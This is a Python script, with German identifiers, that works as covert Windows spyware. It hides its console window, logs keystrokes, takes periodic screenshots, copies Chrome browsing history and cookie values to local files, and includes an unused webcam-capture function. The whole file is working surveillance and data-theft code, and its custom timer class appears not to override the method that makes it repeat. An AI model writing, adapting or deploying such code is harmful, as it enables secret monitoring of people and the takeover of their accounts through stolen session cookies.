import time
import os
import sys
import platform
import sqlite3
import socket
import requests
import urllib.request
import json
import logging
from threading import Timer, Thread
from PIL import ImageGrab
from mss import mss
import getpass
import win32console
from win32 import win32gui
import win32ui, win32con, win32api
from ecapture import ecapture as ec
from pynput import keyboard

BENUTZERNAME = getpass.getuser()

def verstecken():
    fenster = win32console.GetConsoleWindow()
    win32gui.ShowWindow(fenster, 0)

class IntervallTimer(Timer):
    def ausführen(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

class Überwachung:
    def __init__(self):
        self.log_verzeichnis = r'.\logs'
        self.sysinfo_verzeichnis = os.path.join(self.log_verzeichnis, 'sysinfo')
        self.bildschirmfotos_verzeichnis = os.path.join(self.log_verzeichnis, 'bildschirmfotos')
        self.tastenprotokolle_verzeichnis = os.path.join(self.log_verzeichnis, 'tastenprotokolle')
        self.chrome_verzeichnis = os.path.join(self.log_verzeichnis, 'chrome')
        self.verlauf_verzeichnis = os.path.join(self.chrome_verzeichnis, 'verlauf')
        self.cookies_verzeichnis = os.path.join(self.chrome_verzeichnis, 'cookies')
        self.webcam_verzeichnis = os.path.join(self.log_verzeichnis, 'webcam')
        
        self._logs_erstellen()

    def _bei_tastendruck(self, k):
        with open(os.path.join(self.tastenprotokolle_verzeichnis, 'protokoll.txt'), 'a') as f:
            f.write('Tastendrücke: {}\t\t{}\n'.format(k, time.ctime()))

    def _logs_erstellen(self):
        os.makedirs(self.sysinfo_verzeichnis, exist_ok=True)
        os.makedirs(self.bildschirmfotos_verzeichnis, exist_ok=True)
        os.makedirs(self.tastenprotokolle_verzeichnis, exist_ok=True)
        os.makedirs(self.verlauf_verzeichnis, exist_ok=True)
        os.makedirs(self.cookies_verzeichnis, exist_ok=True)
        os.makedirs(self.webcam_verzeichnis, exist_ok=True)

    def sysinfo(self):
        holsysinfo = {
            'holinfo': platform.uname(),
            'holarchitektur': platform.architecture(),
            'holversion': sys.version,
            'holanmeldung': os.getlogin(),
            'holpid': os.getpid(),
            'holumgebung': os.getenv('APPDATA'),
            'holzeit': time.ctime(time.time())
        }

        kombiniert = f"[Svens Skript wurde ausgeführt am {holsysinfo['holzeit']} [+++] [+++] Detaillierte Windows PC-Systeminfo: {holsysinfo['holinfo']} [+++] Python Version: {holsysinfo['holversion']} [+++] [+++] Systemarchitektur: {holsysinfo['holarchitektur']} [+++] [+++] Benutzer: {holsysinfo['holanmeldung']} [+++] [+++] PID: {holsysinfo['holpid']} [+++] [+++] Umgebung: {holsysinfo['holumgebung']} [+++]"
        
        log_datei = os.path.join(self.sysinfo_verzeichnis, f'{time.time()}.txt')
        with open(log_datei, 'w') as f:
            f.write(repr(kombiniert) + '\n')

    def verlauf_speichern(self):
        try:
            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\History")
            cur = con.cursor()
            ausgabe_datei = open(os.path.join(self.verlauf_verzeichnis, f'{time.time()}.txt'), 'a')
            cur.execute('SELECT url, title, last_visit_time FROM urls')
            for row in cur.fetchall():
                ausgabe_datei.write("Website: %s \n\t Titel: %s \n\t Letzte Besuchte Seiten: %s \n\n" % (
                    u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                    u''.join(str(row[2])).encode('utf-8').strip()))
            ausgabe_datei.close()
            con.close()
        except Exception as e:
            logging.error(f"Fehler bei der Verlaufsspeicherung: {e}")

    def cookies_speichern(self):
        try:
            con = sqlite3.connect(os.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Cookies")
            cur = con.cursor()
            ausgabe_datei = open(os.path.join(self.cookies_verzeichnis, f'{time.time()}.txt'), 'a')
            cur.execute('SELECT host_key, name, value FROM Cookies')
            for row in cur.fetchall():
                ausgabe_datei.write("Hostname: %s \n\t Name: %s \n\t Wert: %s \n\n" % (
                    u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
                    u''.join(row[2]).strip()))
            ausgabe_datei.close()
            con.close()
        except Exception as e:
            logging.error(f"Fehler bei der Speicherung von Cookies: {e}")

    def _tastenprotokoll(self):
        with keyboard.Listener(on_press=self._bei_tastendruck) as listener:
            listener.join()

    def _bildschirmfoto(self):
        sct = mss()
        sct.shot(output=os.path.join(self.bildschirmfotos_verzeichnis, f'{time.time()}.png'))

    def webcam(self):
        try:
            ec.capture(0, False, os.path.join(self.webcam_verzeichnis, f'{time.time()}.jpg'))
        except Exception as e:
            logging.error(f"Fehler bei der Webcam-Aufnahme: {e}")
            


    def ausführen(self, intervall=60):
        self.sysinfo()
        Thread(target=self._tastenprotokoll).start()
        IntervallTimer(intervall, self._bildschirmfoto).start()
        IntervallTimer(intervall, self.verlauf_speichern).start()
        IntervallTimer(intervall, self.cookies_speichern).start()

if __name__ == '__main__':
    verstecken()
    überwachung = Überwachung()
    überwachung.ausführen()
